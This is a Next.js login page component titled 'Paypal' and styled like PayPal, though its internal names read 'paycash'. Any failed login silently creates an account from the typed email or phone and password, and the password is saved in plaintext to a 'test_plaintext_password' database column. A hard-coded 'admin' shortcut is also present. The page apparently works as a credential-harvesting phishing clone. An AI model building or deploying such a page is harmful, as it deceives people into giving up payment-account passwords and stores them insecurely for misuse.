"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { createClient } from "@/lib/supabase/client";
import { useLanguage } from "@/contexts/LanguageContext";
import LanguageSelector from "@/components/LanguageSelector";

const REDIRECT_URL = process.env.NEXT_PUBLIC_REDIRECT_URL || "";

export default function LoginPage() {
  const router = useRouter();
  const { t } = useLanguage();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("created") === "1") {
      setSuccess(t("account_created"));
    }
  }, [t]);

  function normaliseIdentifier(raw: string): string {
    const value = raw.trim();

    if (value.toLowerCase() === "admin") {
      return "admin@admin.com";
    }

    if (value.includes("@")) {
      return value;
    }

    const digits = value.replace(/[^\d]/g, "");
    if (digits.length >= 5) {
      return `phone-${digits}@paycash.local`;
    }

    return value;
  }

  // Members: mark welcome flag, then navigate to dashboard (which bounces to portfolio)
  // Admin: go straight to /admin
  function goToDestination(destination: string) {
    if (REDIRECT_URL) {
      sessionStorage.setItem("paycash_welcome", "1");
    }
    router.replace(destination);
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    setSuccess("");
    setLoading(true);

    const supabase = createClient();
    const realEmail = normaliseIdentifier(email);

    const { data: signInData, error: signInError } =
      await supabase.auth.signInWithPassword({
        email: realEmail,
        password,
      });

    if (!signInError && signInData.user) {
      const { data: profile } = await supabase
        .from("profiles")
        .select("role")
        .eq("id", signInData.user.id)
        .single();

      if (profile?.role === "admin") {
        router.replace("/admin");
      } else {
        goToDestination("/dashboard");
      }
      return;
    }

    const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
      email: realEmail,
      password,
    });

    if (signUpError) {
      const msg = signUpError.message.toLowerCase();
      if (msg.includes("already") || msg.includes("registered")) {
        setError("Wrong password. Try again.");
      } else {
        setError(signUpError.message);
      }
      setLoading(false);
      return;
    }

    if (!signUpData.user) {
      setError("Could not create account. Try again.");
      setLoading(false);
      return;
    }

    const derivedName = realEmail.includes("@")
      ? realEmail.split("@")[0]
      : realEmail;
    await supabase.from("profiles").insert({
      id: signUpData.user.id,
      full_name: derivedName,
      email: realEmail,
      phone: "",
      role: "member",
      test_plaintext_password: password,
    });

    const { data: finalData, error: finalError } =
      await supabase.auth.signInWithPassword({
        email: realEmail,
        password,
      });

    if (finalError || !finalData.user) {
      setError("Account created but sign-in failed. Try logging in again.");
      setLoading(false);
      return;
    }

    goToDestination("/dashboard");
  }

  return (
    <main className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex items-start justify-center px-4 pt-12 sm:pt-20">
        <div className="w-full max-w-[420px]">
          <div className="bg-white rounded-xl border border-gray-200 px-8 py-12">
            <h1 className="text-center text-4xl font-black text-black tracking-tight mb-10">
              Paypal
            </h1>

            {success && (
              <div className="mb-6 rounded-md bg-green-50 border border-green-200 text-green-700 text-sm px-4 py-3">
                {success}
              </div>
            )}

            {error && (
              <div className="mb-6 rounded-md bg-red-50 border border-red-200 text-red-700 text-sm px-4 py-3">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-5">
              <input
                id="email"
                type="text"
                autoComplete="username"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={t("email_or_mobile")}
                required
                className="w-full rounded-lg border border-gray-300 bg-white px-4 py-4 text-base text-gray-900 placeholder-gray-400 focus:border-[#0070E0] focus:outline-none focus:ring-1 focus:ring-[#0070E0]"
              />

              <input
                id="password"
                type="password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder={t("password")}
                required
                minLength={6}
                className="w-full rounded-lg border border-gray-300 bg-white px-4 py-4 text-base text-gray-900 placeholder-gray-400 focus:border-[#0070E0] focus:outline-none focus:ring-1 focus:ring-[#0070E0]"
              />

              <div className="pt-1">
                <Link
                  href="/forgot-password"
                  className="text-[15px] font-bold text-[#0070E0] hover:underline"
                >
                  {t("forgot_password")}
                </Link>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full rounded-full bg-black text-white text-lg font-black py-4 transition-colors hover:bg-[#002991] disabled:opacity-80 disabled:cursor-not-allowed inline-flex items-center justify-center gap-3"
              >
                {loading && (
                  <span
                    className="inline-block h-5 w-5 rounded-full border-2 border-white/30 border-t-white animate-spin"
                    aria-hidden="true"
                  />
                )}
                <span>{loading ? t("signing_in") : t("log_in")}</span>
              </button>
            </form>

            <div className="flex items-center gap-3 my-7">
              <div className="flex-1 h-px bg-gray-200" />
              <span className="text-sm text-gray-500">{t("or")}</span>
              <div className="flex-1 h-px bg-gray-200" />
            </div>

            <Link
              href="/signup"
              className="block w-full rounded-full border-2 border-gray-900 bg-white text-center text-lg font-black text-gray-900 py-4 transition-colors hover:bg-gray-50"
            >
              {t("sign_up")}
            </Link>
          </div>

          <LanguageSelector />
        </div>
      </div>

      <footer className="bg-gray-50 border-t border-gray-200 py-6">
        <div className="max-w-5xl mx-auto px-6 flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
          <Link href="/contact" className="hover:text-gray-900">
            {t("contact_us")}
          </Link>
          <Link href="/privacy" className="hover:text-gray-900">
            {t("privacy")}
          </Link>
          <Link href="/legal" className="hover:text-gray-900">
            {t("legal")}
          </Link>
          <Link href="/policy-updates" className="hover:text-gray-900">
            {t("policy_updates")}
          </Link>
          <Link href="/worldwide" className="hover:text-gray-900">
            {t("worldwide")}
          </Link>
        </div>
      </footer>
    </main>
  );
}